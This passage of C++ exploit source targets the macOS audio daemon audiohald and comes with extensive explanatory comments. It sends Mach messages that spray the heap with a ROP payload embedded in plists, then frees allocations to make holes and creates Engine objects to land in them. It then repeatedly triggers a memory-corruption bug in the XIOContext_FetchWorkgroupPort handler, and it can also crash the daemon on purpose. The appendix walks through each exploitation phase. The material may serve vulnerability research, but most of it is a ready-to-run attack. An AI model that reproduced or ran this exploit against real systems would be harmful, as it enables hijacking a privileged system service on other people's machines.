        mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

        delete msg;
        free(data);

        if (result != MACH_MSG_SUCCESS) {
            fprintf(stderr, RED "âŒ Error sending Mach message: %s\n" RESET, mach_error_string(result));
            return 1;
        }

        printf(GREEN "âœ¨ Successfully performed allocations %d\n" RESET, allocation_count + 1);
        usleep(50000);
    }
    return 0;
}

/*
 * Generates a minimal plist to trigger deallocation.
 * Setting 'arr' to a small string causes the previous large allocation to be freed.
 */
char* generateFreePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>arr</key><string>FREE</string></dict></plist>";

    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

/*
 * Frees a previously allocated heap region by replacing the large payload
 * with a small string. This creates "holes" in the heap that can be
 * reclaimed by subsequent allocations (like Engine objects).
 *
 * The goal is to have a vulnerable Engine object land in memory that
 * was previously filled with the ROP payload.
 */
int freeAllocation() {
    xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
    msg->msgh_descriptor_count = 1;
    char *data = generateFreePlist();

    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010034;

    msg->object_id = created_devices.back();
    created_devices.pop_back();
    msg->mSelector = 'acom';
    msg->mScope = 'glob';
    msg->mElement = 0;
    msg->plist_length = strlen(data) + 1;

    mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    
    delete msg;
    free(data);

    if (result != MACH_MSG_SUCCESS) {
        fprintf(stderr, RED "âŒ Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    return 0;
}

/*
 * Triggers the vulnerability by sending message ID 1010059 (XIOContext_FetchWorkgroupPort).
 *
 * This message handler contains a memory corruption bug. When called on an Engine
 * object that has been set up through heap grooming, it may:
 *   - Dereference a dangling pointer
 *   - Access corrupted object data
 *   - Execute the ROP chain placed in heap memory
 *
 * The object_id parameter specifies which Engine object to target.
 */
void trigger_vulnerability(uint32_t object_id) {
    xiocontext_fetch_workgroup_port_mach_message *msg = new xiocontext_fetch_workgroup_port_mach_message;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = sizeof(xiocontext_fetch_workgroup_port_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010059;  // XIOContext_FetchWorkgroupPort - THE VULNERABLE HANDLER

    msg->object_id = object_id;

    kern_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xiocontext_fetch_workgroup_port_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Error in mach_msg send and receive: %s\n" RESET, mach_error_string(result));
        delete msg;
        return;
    }

    delete msg;
}

/*
 * Enumerates all Engine objects and randomly selects one to exploit.
 *
 * Engine objects have type "ngnejboa" (reversed: "aobjenng" = "EngineObject").
 * Scanning object IDs 0x20-200 covers the typical range where these land.
 * A random selection adds unpredictability to exploitation attempts.
 */
uint32_t getRandomEngineObject() {
    uint32_t matches[1000];
    size_t count = 0;

    // Scan for Engine objects in the typical ID range
    for (uint32_t i = 0x20; i < 200; i++) {
        char *object_type = getObjectType(i);

        if (object_type) {
            if (!strcmp(object_type, "ngnejboa")) {  // "ngnejboa" = Engine object
                printf(GREEN " -> Found ENGN object at ID %d\n" RESET, i);
                matches[count++] = i;
            }
            free(object_type);
        }
    }

    if (count == 0) {
        printf(RED "âŒ ENGN object not found, something is wrong...\n" RESET);
        exit(1);
    }

    // arc4random_uniform() - <stdlib.h> (macOS) - cryptographically secure random
    // Randomly select one of the found Engine objects
    uint32_t chosen = matches[arc4random_uniform(count)];
    printf(MAGENTA "ğŸ¯ Random ENGN object chosen to try to exploit: %d\n" RESET, chosen);
    return chosen;
}

/*
 * Initializes connection to audiohald.
 *
 * 1. Gets the bootstrap port from the kernel
 * 2. Looks up the audiohald service by name
 * 3. Sends XSystem_Open to register as a client
 */
void initialize() {
    // task_get_bootstrap_port() - <mach/mach.h>
    // Gets the bootstrap port which is used to look up system services
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Failed to get bootstrap port, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "âœ… Got Bootstrap port! %d\n" RESET, bootstrap_port);

    // bootstrap_look_up() - <servers/bootstrap.h>
    // Looks up a Mach service by name, returns a send right to its port
    // This is how we get a connection to audiohald
    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS) {
        printf(RED "âŒ bootstrap lookup failed, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "âœ… Got service port! %d\n" RESET, service_port);
    printf(BLUE "ğŸ‘‰ Initializing client...\n" RESET);
    sendInitializeClientMessage();
}

/*
 * getopt.h - Command-line argument parsing
 * Provides:
 *   - getopt_long()     : Parse long-form command line options (--flag)
 *   - struct option     : Long option definition structure
 *   - optarg            : Global pointer to current option's argument
 *   - required_argument : Option requires an argument
 *   - no_argument       : Option takes no argument
 */
#include <getopt.h>

/*
 * Prints command-line usage information.
 */
void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [options]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --iterations <n>    Number of grooming iterations (default: 0)\n");
    fprintf(stderr, "  --allocs <n>        Allocations per iteration (default: 0)\n");
    fprintf(stderr, "  --frees <n>         Number of objects to free (default: 0)\n");
    fprintf(stderr, "  --objects <n>       Number of engine objects to create (default: 0)\n");
    fprintf(stderr, "  --pre-crash         Trigger a crash before main exploit attempts (default: false)\n");
    fprintf(stderr, "  --attempts <n>      Number of exploit attempts (default: 0)\n");
    fprintf(stderr, "  --help              Show this help message\n");
}

/*
 * Main entry point - orchestrates the exploitation phases.
 *
 * Usage: ./exploit [options]
 *   --iterations <n>  Number of heap spray iterations
 *   --allocs <n>      Allocations per iteration (payload copies in each plist)
 *   --frees <n>       Number of allocations to free (creates heap holes)
 *   --objects <n>     Number of Engine objects to create
 *   --pre-crash       Crash audiohald first to reset state
 *   --attempts <n>    Number of exploit trigger attempts
 *
 * Typical exploitation flow:
 *   ./exploit --iterations 100 --allocs 50 --frees 20 --objects 5 --attempts 10
 */
int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);  // Disable stdout buffering for real-time output

    // Exploitation parameters (set via command line)
    uint32_t num_frees = 0;           // How many allocations to free
    uint32_t num_engine_objects = 0;  // How many vulnerable objects to create
    uint32_t trigger_pre_crash = 0;   // Whether to crash audiohald first
    uint32_t num_attempts = 0;        // How many times to trigger the bug

    static struct option long_options[] = {
        {"iterations", required_argument, 0, 'i'},
        {"allocs",     required_argument, 0, 'a'},
        {"frees",      required_argument, 0, 'f'},
        {"objects",    required_argument, 0, 'o'},
        {"pre-crash",  no_argument,       0, 'c'},
        {"attempts",   required_argument, 0, 't'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "i:a:f:o:ct:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i': num_iterations = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'a': allocs_per_iteration = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'f': num_frees = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'o': num_engine_objects = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'c': trigger_pre_crash = 1; break;
            case 't': num_attempts = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }

    // Connect to audiohald and register as a client
    initialize();

    /*
     * PHASE 1: HEAP GROOMING
     * Fill the heap with controlled data (ROP payload embedded in plist strings).
     * This establishes a predictable heap layout.
     */
    if (num_iterations > 0) {
        printf(BLUE "\n--- HEAP GROOMING PHASE ---\n" RESET);
        printf("Performing %d iterations of %d allocations\n", num_iterations, allocs_per_iteration);
        sleep(2);
        doAllocations(num_iterations);
    }

    /*
     * PHASE 2: HOLE CREATION
     * Free some allocations to create gaps in the heap.
     * Subsequent allocations (Engine objects) may land in these freed regions.
     */
    if (num_frees > 0) {
        printf(BLUE "\n--- FREEING PHASE ---\n" RESET);
        if (num_frees > created_devices.size()) {
            num_frees = created_devices.size();
        }
        for (uint32_t i = 0; i < num_frees; i++) {
            printf("ğŸ•³ï¸  Freeing allocation %d...\n", i + 1);
            freeAllocation();
        }
    }

    /*
     * PHASE 3: VULNERABLE OBJECT CREATION
     * Create Engine/Tap objects that contain the vulnerable code path.
     * These may land in the freed heap regions containing our ROP payload.
     */
    if (num_engine_objects > 0) {
        printf(BLUE "\n--- VULNERABLE OBJECT CREATION ---\n" RESET);
        createEngineObjects(num_engine_objects);
    }

    /*
     * OPTIONAL: PRE-CRASH
     * Crash audiohald to reset its state. When it respawns, existing
     * Engine objects from other processes may be in a different state.
     */
    if (trigger_pre_crash) {
        printf(MAGENTA "\nğŸ’£ Triggering a crash so we can load new ENGN objects...\n" RESET);
        trigger_vulnerability(0x1);  // Invalid object ID causes crash
        printf(YELLOW "â³ Triggered crash, waiting for coreaudiod to respawn...\n" RESET);
        sleep(5);
        initialize();  // Reconnect after respawn
    }

    /*
     * PHASE 4: EXPLOITATION ATTEMPTS
     * Repeatedly trigger the vulnerability on random Engine objects.
     * If heap grooming was successful, one of these triggers will
     * execute our ROP chain.
     */
    if (num_attempts > 0) {
        printf(BLUE "\n--- EXPLOIT ATTEMPT PHASE ---\n" RESET);
        for (uint32_t i = 0; i < num_attempts; i++) {
            printf(CYAN "\nğŸ” Attempt %d of %d: Enumerating ENGN objects in the Audio HAL...\n" RESET, i + 1, num_attempts);
            uint32_t engn_id = getRandomEngineObject();
            printf(MAGENTA "ğŸ’¥ Triggering vulnerability on it...\n" RESET);
            trigger_vulnerability(engn_id);
            printf(YELLOW "ğŸ˜´ Sleeping for 5 seconds...\n" RESET);
            sleep(5);  // Wait for potential crash/exploit effect
        }
    }

    printf(GREEN "\nğŸ‰ All stages complete.\n" RESET);
    return 0;
}

/*
 * =============================================================================
 * APPENDIX: COMPLETE SYSTEM TRACE FOR KEY FUNCTIONS
 * =============================================================================
 *
 * This section documents the complete call chain from userspace to kernel
 * for each key function used in this exploit. References are from:
 *   - XNU kernel source (osfmk/, bsd/)
 *   - macOS SDK headers (/usr/include/)
 *   - libsyscall (Mach trap wrappers)
 *
 * =============================================================================
 * 1. mach_msg() - Core Mach IPC Primitive
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/message.h>
 *   Library:   libSystem.B.dylib (via libsyscall)
 *   Prototype: mach_msg_return_t mach_msg(
 *                mach_msg_header_t *msg,
 *                mach_msg_option_t option,
 *                mach_msg_size_t send_size,
 *                mach_msg_size_t rcv_size,
 *                mach_port_name_t rcv_name,
 *                mach_msg_timeout_t timeout,
 *                mach_port_name_t notify);
 *
 * CALL CHAIN:
 *   User: mach_msg()
 *     -> libsyscall: mach_msg() wrapper in libsyscall/mach/mach_msg.c
 *       -> Mach trap: mach_msg_trap (trap #-31)
 *         -> Kernel: mach_msg_trap() in osfmk/ipc/mach_msg.c
 *           -> ipc_kmsg_copyin() - copy message from userspace
 *           -> ipc_kmsg_send() - enqueue to destination port
 *           -> ipc_mqueue_send() - actual send to message queue
 *           -> [if receiving] ipc_mqueue_receive() - dequeue message
 *           -> ipc_kmsg_copyout() - copy message to userspace
 *
 * KEY KERNEL FILES:
 *   osfmk/ipc/mach_msg.c      - Main mach_msg implementation
 *   osfmk/ipc/ipc_kmsg.c      - Kernel message handling
 *   osfmk/ipc/ipc_mqueue.c    - Message queue operations
 *   osfmk/ipc/ipc_port.c      - Port operations
 *
 * MESSAGE FLOW:
 *   1. Userspace fills mach_msg_header_t with:
 *      - msgh_bits: port rights disposition
 *      - msgh_size: total message size
 *      - msgh_remote_port: destination (audiohald's service port)
 *      - msgh_local_port: reply port (or MACH_PORT_NULL)
 *      - msgh_id: message identifier (e.g., 1010034, 1010059)
 *
 *   2. Kernel validates and copies in the message
 *   3. For complex messages (MACH_MSGH_BITS_COMPLEX):
 *      - Copies OOL (out-of-line) memory descriptors
 *      - Transfers port rights as specified
 *   4. Message queued to destination port
 *   5. Destination (audiohald) receives via its mach_msg() call
 *
 * =============================================================================
 * 2. mach_port_allocate() - Create a New Mach Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h> (via <mach/mach.h>)
 *   Prototype: kern_return_t mach_port_allocate(
 *                ipc_space_t task,
 *                mach_port_right_t right,
 *                mach_port_name_t *name);
 *
 * CALL CHAIN:
 *   User: mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
 *     -> MIG stub: _mach_port_allocate() generated from mach_port.defs
 *       -> Mach message to task's special port
 *         -> Kernel: mach_port_allocate() in osfmk/ipc/mach_port.c
 *           -> ipc_port_alloc() - allocate ipc_port structure
 *           -> ipc_entry_alloc() - allocate entry in IPC space
 *           -> Returns port name to userspace
 *
 * KEY KERNEL FILES:
 *   osfmk/ipc/mach_port.c     - Port manipulation routines
 *   osfmk/ipc/ipc_port.c      - Port structure allocation
 *   osfmk/ipc/ipc_entry.c     - IPC namespace entry management
 *   osfmk/ipc/ipc_space.c     - IPC space (namespace) management
 *
 * PORT RIGHTS:
 *   MACH_PORT_RIGHT_RECEIVE (1) - Can receive messages on this port
 *   MACH_PORT_RIGHT_SEND (0)    - Can send messages to this port
 *   MACH_PORT_RIGHT_SEND_ONCE (2) - One-time send right
 *
 * =============================================================================
 * 3. mach_port_insert_right() - Add Rights to a Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h>
 *   Prototype: kern_return_t mach_port_insert_right(
 *                ipc_space_t task,
 *                mach_port_name_t name,
 *                mach_port_t poly,
 *                mach_msg_type_name_t polyPoly);
 *
 * CALL CHAIN:
 *   User: mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND)
 *     -> MIG stub -> Kernel: mach_port_insert_right()
 *       -> ipc_object_copyin() - validate source right
 *       -> ipc_object_copyout() - install in target space
 *
 * COMMON USAGE:
 *   After allocating a receive right, insert a send right to the same port
 *   so we can both send to and receive from it (bidirectional communication).
 *
 * =============================================================================
 * 4. bootstrap_look_up() - Service Port Discovery
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <servers/bootstrap.h>
 *   Library:   libxpc.dylib (wraps launchd communication)
 *   Prototype: kern_return_t bootstrap_look_up(
 *                mach_port_t bp,
 *                const name_t service_name,
 *                mach_port_t *sp);
 *
 * CALL CHAIN:
 *   User: bootstrap_look_up(bootstrap_port, "com.apple.audio.audiohald", &port)
 *     -> libxpc: Sends lookup request to launchd
 *       -> launchd: Finds registered service
 *         -> Returns send right to service's port
 *           -> User receives send right in *sp
 *
 * KEY POINTS:
 *   - bootstrap_port is inherited from parent process (set by kernel at exec)
 *   - launchd (PID 1) manages the bootstrap namespace
 *   - Services register with launchd via bootstrap_check_in()
 *   - Clients discover services via bootstrap_look_up()
 *
 * AUDIOHALD REGISTRATION:
 *   audiohald registers "com.apple.audio.audiohald" with launchd
 *   This gives us a send right to communicate with the daemon
 *
 * =============================================================================
 * 5. task_get_bootstrap_port() - Get Bootstrap Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h> (via <mach/mach.h>)
 *   Prototype: kern_return_t task_get_bootstrap_port(
 *                task_t task,
 *                mach_port_t *bootstrap_port);
 *
 * CALL CHAIN:
 *   User: task_get_bootstrap_port(mach_task_self(), &bootstrap_port)
 *     -> MIG call to task's special port
 *       -> Kernel: Returns task->itk_bootstrap
 *
 * KEY POINTS:
 *   - Bootstrap port is set when a task is created
 *   - Typically inherited from parent, ultimately from launchd
 *   - This is the entry point to the Mach service namespace
 *
 * =============================================================================
 * 6. vm_allocate() - Allocate Virtual Memory
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/vm_map.h>
 *   Prototype: kern_return_t vm_allocate(
 *                vm_map_t target_task,
 *                vm_address_t *address,
 *                vm_size_t size,
 *                int flags);
 *
 * CALL CHAIN:
 *   User: vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE)
 *     -> Mach trap or MIG call
 *       -> Kernel: vm_allocate() in osfmk/vm/vm_user.c
 *         -> vm_map_enter() - insert mapping into VM map
 *           -> Allocates anonymous memory (zero-filled)
 *           -> Returns virtual address
 *
 * KEY KERNEL FILES:
 *   osfmk/vm/vm_user.c        - User-facing VM operations
 *   osfmk/vm/vm_map.c         - VM map manipulation
 *   osfmk/vm/vm_resident.c    - Physical page management
 *
 * FLAGS:
 *   VM_FLAGS_ANYWHERE (1) - Kernel chooses the address
 *   VM_FLAGS_FIXED (0)    - Use the specified address
 *
 * USAGE IN EXPLOIT:
 *   Allocates OOL (out-of-line) memory for Mach messages
 *   The kernel will map this memory into audiohald's address space
 *   when the message is received
 *
 * =============================================================================
 * 7. mach_task_self() - Get Current Task Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_init.h> (via <mach/mach.h>)
 *   Prototype: mach_port_t mach_task_self(void);
 *
 * IMPLEMENTATION:
 *   Actually a macro: #define mach_task_self() mach_task_self_
 *   mach_task_self_ is a global variable set at process startup
 *   Contains a send right to the current task's kernel task port
 *
 * KEY POINTS:
 *   - Provides access to task-level operations (memory, ports, threads)
 *   - Used as first argument to many mach_* functions
 *   - Set by dyld during process initialization
 *
 * =============================================================================
 * 8. CoreFoundation Plist Functions - Payload Encoding
 * =============================================================================
 *
 * CFArrayCreateMutable() / CFDictionaryCreateMutable()
 *   Header:    <CoreFoundation/CFArray.h>, <CoreFoundation/CFDictionary.h>
 *   Creates mutable collections for building plist structure
 *
 * CFStringCreateWithBytes()
 *   Header:    <CoreFoundation/CFString.h>
 *   Creates CFString from raw bytes with specified encoding
 *   Used to embed arbitrary binary data (ROP payload) as UTF-16 string
 *
 * CFPropertyListCreateData()
 *   Header:    <CoreFoundation/CFPropertyList.h>
 *   Serializes CFPropertyList (dict/array) to binary plist format
 *   This is the key function that encodes our payload for transmission
 *
 * PLIST ENCODING PATH:
 *   1. Load ROP payload bytes from rop_payload.bin
 *   2. Interpret bytes as UTF-16LE code units
 *   3. Create CFString from these "characters"
 *   4. Wrap in CFArray, then CFDictionary
 *   5. Serialize to binary plist via CFPropertyListCreateData()
 *   6. Send via Mach OOL descriptor to audiohald
 *   7. audiohald parses plist, allocating CFString with our payload bytes
 *
 * =============================================================================
 * 9. OOL (Out-of-Line) Memory Transfer
 * =============================================================================
 *
 * MECHANISM:
 *   Large data is transferred "out of line" rather than inline in the message.
 *   The mach_msg_ool_descriptor_t describes the memory region:
 *     - address: pointer to data in sender's address space
 *     - size: length in bytes
 *     - deallocate: whether to deallocate sender's copy after send
 *     - copy: MACH_MSG_VIRTUAL_COPY or MACH_MSG_PHYSICAL_COPY
 *
 * KERNEL HANDLING:
 *   1. Sender calls mach_msg() with OOL descriptor
 *   2. Kernel copies/maps OOL data from sender
 *   3. When receiver calls mach_msg(), kernel maps data into receiver
 *   4. Receiver gets pointer to mapped memory in their address space
 *
 * KEY KERNEL CODE:
 *   osfmk/ipc/ipc_kmsg.c:
 *     ipc_kmsg_copyin_ool_descriptor() - copyin OOL data
 *     ipc_kmsg_copyout_ool_descriptor() - copyout OOL data
 *
 * SECURITY IMPLICATIONS:
 *   OOL data ends up allocated in receiver's heap
 *   This is the basis for heap spraying attacks
 *   Controlled data lands at predictable heap locations
 *
 * =============================================================================
 * 10. Message ID Dispatch in audiohald
 * =============================================================================
 *
 * AUDIOHALD MESSAGE HANDLERS:
 *   The msgh_id field identifies which operation to perform:
 *
 *   1010000 - XSystem_Open
 *             Client registration, creates client state
 *
 *   1010002 - XSystem_GetObjectInfo
 *             Query object type by ID, used for enumeration
 *
 *   1010005 - XSystem_CreateMetaDevice
 *             Create aggregate audio device, used for heap grooming
 *
 *   1010034 - XObject_SetPropertyData (with plist)
 *             Set property data, used for heap spray (selector 'acom')
 *
 *   1010042 - XObject_GetPropertyData (with plist)
 *             Get property, but 'mktp' selector creates Engine/Tap object
 *
 *   1010059 - XIOContext_FetchWorkgroupPort
 *             THE VULNERABLE HANDLER - triggers memory corruption
 *
 * DISPATCH MECHANISM:
 *   audiohald has a MIG-generated dispatch table
 *   Each message ID maps to a handler function
 *   Message body is parsed according to expected structure
 *
 * =============================================================================
 * 11. Memory Corruption Trigger Point
 * =============================================================================
 *
 * VULNERABILITY:
 *   Message 1010059 (XIOContext_FetchWorkgroupPort) contains a bug
 *   When called on an Engine object:
 *     - May access freed/reallocated memory
 *     - May dereference controlled pointers
 *     - May call through controlled function pointers
 *
 * EXPLOITATION:
 *   1. Spray heap with ROP payload via plist allocations
 *   2. Free some allocations to create holes
 *   3. Create Engine objects that may land in controlled memory
 *   4. Trigger vulnerability - Engine object's memory contains ROP
 *   5. Controlled data treated as object, function pointer called
 *   6. ROP chain executes
 *
 * =============================================================================
 * END OF SYSTEM TRACE DOCUMENTATION
 * =============================================================================
 */

/*
 * #############################################################################
 * #############################################################################
 * ##                                                                         ##
 * ##            PART 2: DEEP TECHNICAL DOCUMENTATION                         ##
 * ##                                                                         ##
 * #############################################################################
 * #############################################################################
 *
 * This section provides atomic-level detail on every component of this exploit:
 *   - XNU Mach IPC kernel internals
 *   - Heap grooming theory and practice
 *   - ROP (Return-Oriented Programming) chain mechanics
 *   - Binary plist format and CFString internal storage
 *   - audiohald object model and memory layout
 *   - Exploitation primitives and control flow hijacking
 *
 * =============================================================================
 * =============================================================================
 * SECTION A: XNU MACH IPC KERNEL INTERNALS - COMPLETE DEEP DIVE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * A.1 THE MACH MICROKERNEL ARCHITECTURE
 * -----------------------------------------------------------------------------
 *
 * XNU (X is Not Unix) is a hybrid kernel combining:
 *   - Mach 3.0 microkernel (CMU) - IPC, VM, threading
 *   - BSD 4.4 - POSIX APIs, networking, filesystems
 *   - I/O Kit - device drivers (C++ based)
 *
 * The Mach layer provides the fundamental IPC mechanism used by all macOS
 * services. Unlike Unix pipes/sockets, Mach IPC is capability-based:
 *   - "Ports" are kernel-managed communication endpoints
 *   - "Rights" are capabilities to send/receive on ports
 *   - Rights can be transferred between tasks (processes)
 *
 * KEY INSIGHT: Every system service on macOS (including audiohald) is reached
 * via Mach IPC. The kernel is the trusted intermediary for all communication.
 *
 * -----------------------------------------------------------------------------
 * A.2 PORT INTERNALS - struct ipc_port
 * -----------------------------------------------------------------------------
 *
 * A Mach port is represented in the kernel by struct ipc_port (osfmk/ipc/ipc_port.h):
 *
 *   struct ipc_port {
 *       struct ipc_object       ip_object;      // Base object (refcount, lock)
 *       struct ipc_mqueue       ip_messages;    // Queue of pending messages
 *       union {
 *           struct ipc_space   *receiver;       // Task that owns receive right
 *           struct ipc_port    *destination;    // For dead-name notifications
 *       } data;
 *       uint32_t                ip_mscount;     // Make-send count
 *       uint32_t                ip_srights;     // Send rights count
 *       uint32_t                ip_sorights;    // Send-once rights count
 *       // ... many more fields
 *   };
 *
 * MEMORY LAYOUT:
 *   - Ports are allocated from the kernel's zone allocator (kalloc)
 *   - Zone: "ipc ports" - fixed-size allocations for ipc_port structures
 *   - Port address is NEVER exposed to userspace (capability model)
 *
 * USERSPACE VIEW:
 *   - User sees "port names" (32-bit integers) not port addresses
 *   - Names are indices into the task's IPC space (namespace)
 *   - struct ipc_space contains hash table: name -> (port_ptr, rights_type)
 *
 * EXAMPLE:
 *   mach_port_t p = 0x1234;   // This is just a NAME, not an address
 *   Kernel lookup: task->itk_space->is_table[p] -> ipc_entry -> ipc_port*
 *
 * -----------------------------------------------------------------------------
 * A.3 MESSAGE STRUCTURE IN KERNEL - struct ipc_kmsg
 * -----------------------------------------------------------------------------
 *
 * When you call mach_msg(), the kernel creates an ipc_kmsg:
 *
 *   struct ipc_kmsg {
 *       struct ipc_kmsg        *ikm_next;       // Queue linkage
 *       struct ipc_kmsg        *ikm_prev;
 *       mach_msg_size_t         ikm_size;       // Total size
 *       struct ipc_port        *ikm_voucher;    // Voucher port
 *       mach_msg_header_t      *ikm_header;     // Points to message data
 *       // Inline data follows the header in the same allocation
 *   };
 *
 * MESSAGE DATA LAYOUT (within ikm_kmsg allocation):
 *
 *   +---------------------------+
 *   | ipc_kmsg header           |  <- struct ipc_kmsg fields
 *   +---------------------------+
 *   | mach_msg_header_t         |  <- ikm_header points here
 *   +---------------------------+
 *   | mach_msg_body_t           |  <- for complex messages (descriptor count)
 *   +---------------------------+
 *   | Descriptors[]             |  <- port/OOL memory descriptors
 *   +---------------------------+
 *   | Inline data               |  <- rest of message body
 *   +---------------------------+
 *
 * KERNEL PROCESSING FLOW:
 *
 *   1. ipc_kmsg_alloc(size)
 *      - Allocates from kalloc (kernel heap) based on message size
 *      - Small messages: inline in ipc_kmsg
 *      - Large messages: separate kalloc allocation for data
 *
 *   2. ipc_kmsg_copyin(kmsg, space, map, option)
 *      - Copies message header from userspace
 *      - Validates port names, converts to kernel port pointers
 *      - Processes descriptors:
 *        - Port descriptors: ipc_kmsg_copyin_port() - acquires port rights
 *        - OOL descriptors: ipc_kmsg_copyin_ool_descriptor() - maps/copies memory
 *
 *   3. ipc_kmsg_send(kmsg, option, timeout)
 *      - Enqueues message on destination port's message queue
 *      - May block if queue is full (MACH_SEND_TIMEOUT)
 *      - Wakes any thread waiting to receive
 *
 * -----------------------------------------------------------------------------
 * A.4 OUT-OF-LINE (OOL) MEMORY TRANSFER - CRITICAL FOR HEAP SPRAY
 * -----------------------------------------------------------------------------
 *
 * OOL memory is the key to heap spraying. Here's exactly how it works:
 *
 * SENDER SIDE (this exploit):
 *
 *   1. We allocate memory: vm_allocate(mach_task_self(), &oolBuffer, size, ...)
 *      - Creates virtual memory pages in OUR address space
 *      - Initially zero-filled (copy-on-write from zero page)
 *
 *   2. We fill it with ROP payload: memcpy(oolBuffer, payload, size)
 *      - Pages become "dirty" (owned by our process)
 *
 *   3. We send via mach_msg() with OOL descriptor:
 *      msg->descriptor[0].address = oolBuffer;
 *      msg->descriptor[0].size = size;
 *      msg->descriptor[0].deallocate = 0;  // Don't free our copy
 *      msg->descriptor[0].copy = MACH_MSG_VIRTUAL_COPY;  // COW if possible
 *
 * KERNEL PROCESSING (ipc_kmsg_copyin_ool_descriptor):
 *
 *   From osfmk/ipc/ipc_kmsg.c:
 *
 *   ipc_kmsg_copyin_ool_descriptor() {
 *       // Get the memory range from sender's address space
 *       vm_map_copy_t copy;
 *
 *       if (descriptor->copy == MACH_MSG_VIRTUAL_COPY) {
 *           // Use copy-on-write optimization
 *           kr = vm_map_copyin(sender_map,
 *                              (vm_map_address_t)descriptor->address,
 *                              (vm_map_size_t)descriptor->size,
 *                              FALSE,  // don't modify source
 *                              &copy);
 *       } else {
 *           // Physical copy - actually copies pages
 *           kr = vm_map_copyin(sender_map, addr, size, TRUE, &copy);
 *       }
 *
 *       // Store the copy object in the kernel message
 *       dsc->address = (void *)copy;
 *   }
 *
 * RECEIVER SIDE (audiohald):
 *
 *   When audiohald calls mach_msg() to receive:
 *
 *   ipc_kmsg_copyout_ool_descriptor() {
 *       vm_map_copy_t copy = (vm_map_copy_t)dsc->address;
 *
 *       // Map the copy into receiver's address space
 *       kr = vm_map_copyout(receiver_map, &addr, copy);
 *
 *       // Now 'addr' in audiohald's space contains our data!
 *       dsc->address = (void *)addr;
 *   }
 *
 * KEY POINTS FOR EXPLOITATION:
 *
 *   1. OOL data becomes a NEW ALLOCATION in audiohald's address space
 *   2. The allocation size is controlled by us (descriptor->size)
 *   3. The content is controlled by us (whatever we put in oolBuffer)
 *   4. For large enough allocations, vm_map_copyout uses vm_allocate
 *      which can hit specific allocator bins (nano, scalable, etc.)
 *
 * COPY-ON-WRITE BEHAVIOR:
 *
 *   - MACH_MSG_VIRTUAL_COPY: Kernel creates COW mapping
 *     - No physical copy until one side modifies the pages
 *     - Memory efficient but can be unpredictable for heap layout
 *
 *   - MACH_MSG_PHYSICAL_COPY: Kernel actually copies the pages
 *     - Guarantees separate physical pages
 *     - More predictable for heap exploitation
 *
